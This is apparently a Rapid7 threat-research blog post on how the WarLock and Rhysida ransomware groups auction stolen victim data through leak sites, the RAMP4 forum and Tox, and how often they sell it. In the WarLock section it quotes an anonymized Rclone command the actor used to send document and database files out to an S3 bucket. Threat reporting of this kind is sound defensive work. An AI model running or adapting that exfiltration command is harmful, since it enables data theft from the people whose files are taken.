# From Extortion to E-commerce: How Ransomware Groups Turn Breaches into Bidding Wars

- **Source :** rapid7
- **URL :** https://www.rapid7.com/blog/post/tr-extortion-ecommerce-ransomware-groups-turn-breaches-into-bidding-wars-research/
- **Date :** 2025-11-24

---

Ransomware has evolved from simple digital extortion into a structured, profit-driven criminal enterprise. Over time, it has led to the development of a complex ecosystem where stolen data is not only leveraged for ransom, but also sold to the highest bidder. This trend first gained traction in 2020 when the Pinchy Spider group, better known as REvil, pioneered the practice of hosting data auctions on the dark web, opening a new chapter in the commercialization of cybercrime.

In 2025, contemporary groups such as WarLock and Rhysida have embraced similar tactics, further normalizing data auctions as part of their extortion strategies. By opening additional profit streams and attracting more participants, these actors are amplifying both the frequency and impact of ransomware operations. The rise of data auctions reflects a maturing underground economy, one that mirrors legitimate market behavior, yet drives the continued expansion and professionalization of global ransomware activity.

## Anatomy of victim data auctions 

Most modern ransomware groups employ double extortion tactics, exfiltrating data from a victim’s network before deploying encryption. Afterward, they publicly claim responsibility for the attack and threaten to release the stolen data unless their ransom demand is met. This dual-pressure technique significantly increases the likelihood of payment.

In recent years, data-only extortion campaigns, in which actors forgo encryption altogether, have risen sharply. In fact, such incidents doubled in 2025, highlighting how the threat of data exposure alone has become an effective extortion lever. Most ransomware operations, however, continue to use encryption as part of their attack chain.

Certain ransomware groups have advanced this strategy by introducing data auctions when ransom negotiations with victims fail. In these cases, threat actors invite potential buyers, such as competitors or other interested parties, to bid on the stolen data, often claiming it will be sold exclusively to a single purchaser. In some instances, groups have been observed selling partial datasets, likely adjusted to a buyer’s specific budget or area of interest, while any unsold data is typically published on dark web leak sites.

This process is illustrated in Figure 1, under the assumption that the threat actor adheres to their stated claims. However, in practice, there is no guarantee that the stolen data will remain undisclosed, even if the ransom is paid. This highlights the inherent unreliability of negotiating with cybercriminals.

⠀

![ransomware-extortion-ecommerce-diagram](https://www.rapid7.com/cdn/images/bltf34ddf7167c8a7bf/69246a5fb054896d6a03d693/extortion-ecommerce-diagram_\(1\).jpg) _Figure 1 - Victim data auctioning process_

⠀

This auction model provides an additional revenue stream, enabling ransomware groups to profit from exfiltrated data even when victims refuse to pay. It should be noted, however, that such auctions are often reserved for high-profile incidents. In these cases, the threat actors exploit the publicity surrounding attacks on prominent organizations to draw attention, attract potential buyers, and justify higher starting bids.

This trend is likely driven by the fragmentation of the ransomware ecosystem following the recent disruption of prominent threat actors, including 8Base and BlackSuit. This shift in cybercrime dynamics is compelling smaller, more agile groups to aggressively compete for visibility and profit through auctions and private sales to maintain financial viability. The emergence of the Crimson Collective in October 2025 exemplified this dynamic when the group auctioned stolen datasets to the highest bidder. Although short-lived, this incident served as a proof of concept (PoC) for the growing viability of monetizing data exfiltration independently of traditional ransom schemes.

## Threat actor spotlight

### WarLock

The WarLock ransomware group has been active since at least June 2025. The group targets organizations across North America, Europe, Asia, and Africa, spanning sectors from technology to critical infrastructure. Since its emergence, WarLock has rapidly gained prominence for its repeated exploitation of vulnerable Microsoft SharePoint servers, leveraging newly disclosed vulnerabilities to gain initial access to targeted systems.

The group adopts double extortion tactics, exfiltrating data from the victim’s systems before deploying its ransomware variant. From a recent incident Rapid7 responded to, we observed the threat actor exfiltrating the data from a victim to an S3 bucket using the tool Rclone. An anonymized version of the command used by the threat actor can be found below:

_Rclone.exe copy \\\localdirectory :s3 -P --include "*.{pdf,ai,dwg,dxf,dwt,doc,docx,dwg,dwt,dws,shx,pat,lin,ctb,dxf,dwf,step,stl,dst,dxb,,stp,ipt,prt,iges,obj,xlsx,mdf,sql,doc,xls,sql,bak,sqlite,db,sqlite3,sdf,ndf,ldf,csv,mdf,dbf,ibd,myd,ppt,pptx}" -q --ignore-existing --auto-confirm --multi-thread-streams 11 --transfers 11 --max-age 500d --max-size 2000m_

WarLock operates a dedicated leak site (DLS) on the dark web, where it lists its victims. From the outset of its operations, the group has auctioned stolen data, publishing only the unsold information online (Figure 2). The group further mentions that the exfiltrated data may be sold to third parties if the victim refuses to pay in their ransom note (Figure 3).

⠀

![2-ransomware-purchased-data.png](https://www.rapid7.com/cdn/images/bltebb5c7f143bce7b9/69246f2daf699d40dbe18506/2-ransomware-purchased-data.png) _Figure 2 - Example of purchased data_

⠀

![3-warlock-ransomware-ransom-note.png](https://www.rapid7.com/cdn/images/bltd3698baa8af09fb5/69246f2d2bfe5b6d5e3ef526/3-warlock-ransomware-ransom-note.png) _Figure 3 - WarLock ransom note_

⠀

Although WarLock shares updates on the progress and results of these auctions through its DLS, it also relies heavily on its presence on the RAMP4 cybercrime forum to attract potential buyers (Figure 4). This approach likely allows WarLock to reach a wider buyer base by publishing these posts under the relevant thread “Auction \ 拍卖会”. It should be noted that WarLock is assessed to be of Chinese origin, which is further supported by the Chinese-language reference in this thread title.

⠀

![4-ransomware-auction-warlock.png](https://www.rapid7.com/cdn/images/bltb1f7bd7be0fa6797/69246f2dd72d26596aafbeca/4-ransomware-auction-warlock.png) _Figure 4 - Mention of an auction on WarLock’s DLS_

⠀

Using the alias “cnkjasdfgd,” the group advertises details about the nature and volume of exfiltrated data, along with sample files (Figure 5). WarLock further directs interested buyers to its Tox account, a peer-to-peer encrypted messaging and video-calling platform, where the auctions appear to take place.

⠀

![5-warlock-ramp4.png](https://www.rapid7.com/cdn/images/blt42b22e609334b7a0/69246f2e2b28371f24b49a8d/5-warlock-ramp4.png) _Figure 5 - WarLock’s post on RAMP4_

⠀

This approach appears to be highly effective for WarLock. Despite being a recent entrant to the ransomware ecosystem, the group has reportedly sold victim data in approximately 55% of its claimed attacks, accounting for 55 victims to date as of November 2025, demonstrating significant traction within underground markets. The remaining victims’ data has been publicly released on the group’s DLS, following unsuccessful ransom negotiations and a lack of interested buyers.

### Rhysida

The Rhysida ransomware group was first identified by cybersecurity researchers in May 2023. The group primarily targets Windows operating systems across both public and private organizations in sectors such as government, defense, education, and manufacturing. Its operations have been observed in several countries, including the United Kingdom, Switzerland, Australia, and Chile. The threat actors portray themselves as a so-called “cybersecurity team” that assists organizations in securing their networks by exposing system vulnerabilities.

Rhysida maintains an active DLS, where it publishes data belonging to victims who refuse to pay the ransom, in alignment with double extortion tactics. Since at least June 2023, the group has also conducted data auctions via a dedicated “Auctions Online” section of its DLS. These auctions typically run for seven days, and Rhysida claims that each dataset is sold exclusively to a single buyer. As of mid-October 2025, the group was hosting five ongoing auctions, with starting prices ranging from 5 to 10 Bitcoin (Figure 6).

⠀

![6-ransomware-auction-rhysida-dls.png](https://www.rapid7.com/cdn/images/bltbff44f7770ccf830/69246f2d25f1f4fc723c0b8c/6-ransomware-auction-rhysida-dls.png) _Figure 6 - Example of an auction on Rhysida’s DLS_

⠀

Once the auction period ends, Rhysida publicly releases any unsold data on its DLS (Figure 7). Instead, if the auction is successful, the data is marked as “sold”, without being released on the group’s DLS (Figure 8). In many cases, the group publishes only a subset of the stolen data, often accompanied by the note “not sold data was published” (Figure 9).

⠀

![7-data-release-ransomware-rhysida.png](https://www.rapid7.com/cdn/images/blt769705e9285f0e07/69246f2eb05489c43e03d6f7/7-data-release-ransomware-rhysida.png) _Figure 7 - Example of full data release on Rhysida’s DLS_

⠀

![8-sold-data-rhysida.png](https://www.rapid7.com/cdn/images/blt9214ab94a22a4565/69246f2e33936a027ee5d854/8-sold-data-rhysida.png) _Figure 8 - Example of sold data on Rhysida’s DLS_

⠀

![9-partial-data-release-rhysida-ransomware.png](https://www.rapid7.com/cdn/images/bltfb93b2360fc19c6a/69247387c3599f720c8f8cb1/9-partial-data-release-rhysida-ransomware.png) _Figure 9 - Example of partial data release on Rhysida’s DLS_

⠀

With 224 claimed attacks to date as of November 2025, approximately 67% resulting in full or partial data sales, auctions represent a significant additional revenue stream for Rhysida. The group’s auction model appears to be considerably more effective than WarLock’s (Figure 10), likely due to Rhysida’s established reputation within the cybercrime ecosystem and its involvement in several high-profile attacks.

⠀

![10-ransomware-auction-outcomes-graph-chart.png](https://www.rapid7.com/cdn/images/bltc0823c731dd9b817/69246f2e179d4339f532d78d/10-ransomware-auction-outcomes-graph-chart.png) _Figure 10 - Overview of auction outcomes_

## Conclusion

The cyber extortion ecosystem is undergoing a profound transformation, shifting from traditional ransom payments to a diversified, market-driven model centered on data auctions and direct sales. This evolution marks a turning point in how ransomware groups generate revenue, transforming what were once isolated extortion incidents into structured commercial transactions.

Groups such as WarLock and Rhysida exemplify this shift, illustrating how ransomware operations increasingly mirror illicit e-commerce ecosystems. By auctioning exfiltrated data, these actors not only create additional revenue streams but also reduce their dependence on ransom compliance, monetizing stolen data even when victims refuse to pay. This approach has proven particularly lucrative for these threat actors, likely setting a precedent for newer extortion groups eager to replicate their success.

As a result, proprietary and sensitive data, including personally identifiable and financial information, is flooding dark web marketplaces at an unprecedented pace. This expanding secondary market intensifies both the operational and reputational risks faced by affected organizations, extending the impact of an attack well beyond its initial compromise.

To adapt to this evolving threat landscape, organizations must move beyond reactive crisis management and embrace a proactive, intelligence-driven defense strategy. Continuous dark web monitoring, early breach detection, and the integration of cyber threat intelligence into response workflows are now essential. In a world where stolen data functions as a tradable commodity, resilience depends not on negotiation but on vigilance, preparedness, and rapid action.

## Article tags

  * [Ransomware](/blog/tag/ransomware/)
  * [Research](/blog/tag/research/)
  * [Labs](/blog/tag/labs/)
  * [Dark Web](/blog/tag/dark-web/)